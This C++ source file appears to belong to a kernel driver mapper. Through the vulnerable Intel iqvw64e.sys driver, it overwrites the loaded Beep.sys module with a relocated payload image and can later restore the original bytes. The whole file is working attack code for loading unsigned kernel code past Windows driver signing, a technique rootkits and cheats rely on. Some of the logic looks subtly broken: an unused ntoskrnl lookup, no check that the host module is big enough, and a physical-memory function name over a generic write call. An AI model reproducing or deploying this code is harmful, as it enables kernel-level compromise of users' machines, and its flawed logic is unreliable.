#include <vector>
#include <string>
#include <Windows.h>
#include "../include/parasite_utils.hpp"
#include "../include/utils.hpp"
#include "../include/intel_driver.hpp"

namespace parasite_utils
{
	bool FindHostModule(uint32_t size, HostModule& host)
	{
		uint64_t ntoskrnl_base = utils::GetKernelModuleBase("ntoskrnl.exe");
		
		uint64_t beep_base = utils::GetKernelModuleBase("Beep.sys");
		if (beep_base)
		{
			host.base = beep_base;
			host.size = size;
			return true;
		}
		
		return false; 
	}

	bool Relocate(void* image, uint64_t target_base, uint64_t source_base)
	{
		uint64_t delta = target_base - source_base;
		if (delta == 0) return true;

		PIMAGE_DOS_HEADER dos_header = reinterpret_cast<PIMAGE_DOS_HEADER>(image);
		PIMAGE_NT_HEADERS64 nt_headers = reinterpret_cast<PIMAGE_NT_HEADERS64>((uint8_t*)image + dos_header->e_lfanew);
		PIMAGE_DATA_DIRECTORY reloc_dir = &nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
		
		if (reloc_dir->Size == 0) return true;

		PIMAGE_BASE_RELOCATION reloc = reinterpret_cast<PIMAGE_BASE_RELOCATION>((uint8_t*)image + reloc_dir->VirtualAddress);
		while (reloc->VirtualAddress != 0)
		{
			uint32_t size = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(uint16_t);
			uint16_t* list = reinterpret_cast<uint16_t*>(reloc + 1);
			for (uint32_t i = 0; i < size; i++)
			{
				if ((list[i] >> 12) == IMAGE_REL_BASED_DIR64)
				{
					uint64_t* ptr = reinterpret_cast<uint64_t*>((uint8_t*)image + reloc->VirtualAddress + (list[i] & 0xFFF));
					*ptr += delta;
				}
			}
			reloc = reinterpret_cast<PIMAGE_BASE_RELOCATION>(reinterpret_cast<uint8_t*>(reloc) + reloc->SizeOfBlock);
		}
		return true;
	}

	bool HijackPhysicalMemory(HANDLE iqvw64e_device_handle, uint64_t target_base, uint8_t* payload, uint32_t size)
	{
		for (uint32_t i = 0; i < size; i += 0x1000)
		{
			uint32_t chunk_size = (size - i > 0x1000) ? 0x1000 : (size - i);
			if (!intel_driver::WriteMemory(iqvw64e_device_handle, target_base + i, payload + i, chunk_size))
			{
				return false;
			}
		}
		return true;
	}

	bool RestoreHost(HANDLE iqvw64e_device_handle, uint64_t target_base, uint8_t* original_data, uint32_t size)
	{
		return HijackPhysicalMemory(iqvw64e_device_handle, target_base, original_data, size);
	}
}
